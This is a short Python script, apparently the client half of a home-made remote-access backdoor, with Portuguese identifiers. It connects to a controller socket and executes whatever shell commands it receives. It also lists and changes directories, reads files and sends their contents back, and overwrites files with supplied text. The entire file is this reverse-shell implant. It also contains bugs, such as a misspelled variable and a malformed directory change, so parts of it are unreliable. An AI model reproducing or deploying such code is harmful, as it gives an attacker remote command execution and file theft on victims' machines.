import socket
import os

host = "localhost"
porta = 50055

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

c.connect((host, porta))

on_off = False
print("ouvindo...")
while not on_off:
    comando = c.recv(2048).decode("utf-8")
    if comando == "cmd":
        cmd = c.recv(2048).decode("utf-8")
        try:
            os.system(cmd)
            confirma = f"\nCLIENTE: recebi o comando [{comabdo}]"
            c.send(confirma.encode("utf-8"))
        except:                                                                           c.send("ERRO AO ESECUTAR O COMANDO".encode("utf-8"))
    elif comando == "ls":
        arquivos = os.popen("ls")
        arquivo_encontrado = arquivos.read()
        c.send(arquivo_encontrado.encode("utf-8"))
    elif comando == "*cd":
        cmd = c.recv(2048).decode("utf-8")
        try:
            if cmd != "*cd":
                redirecionar_arquivo = cmd[:]
                os.chdir(redirecionar_arquivo)
            else:
                os.chdir("cd ..")
        except:
            pass
    elif comando == "pwd":
        caminho_pastas = os.popen("pwd")
        caminho_pastas = caminho_pastas.read()
        c.send(caminho_pastas.encode("utf-8"))
    elif comando == "md file":
        arquivo_modificar = c.recv(2048).decode("utf-8")
        arquivo_texto = c.recv(2048).decode("utf-8")
        if arquivo_texto == "erro-*4*0*4":
            pass
        else:
            try:
                with open(arquivo_modificar, 'w') as arquivo_modificado:
                       arquivo_modificado.write(arquivo_texto)
                c.send("ARQUIVO MODIFICAO".encode("utf-8"))
            except:
                c.send("sim".encode("utf-8"))
    elif comando == "v file":
        ver_arquivo = c.recv(2048).decode("utf-8")
        if ver_arquivo != "eRR_1":
            try:
                with open(ver_arquivo, 'r') as texto_arquivo:
                    texto_arquivo = texto_arquivo.read()
                c.send(texto_arquivo.encode("utf-8"))
            except:
                c.send("eRR_1".encode("utf-8"))
        else:
            c.send("eRR_1".encode("utf-8"))
    else:
        pass
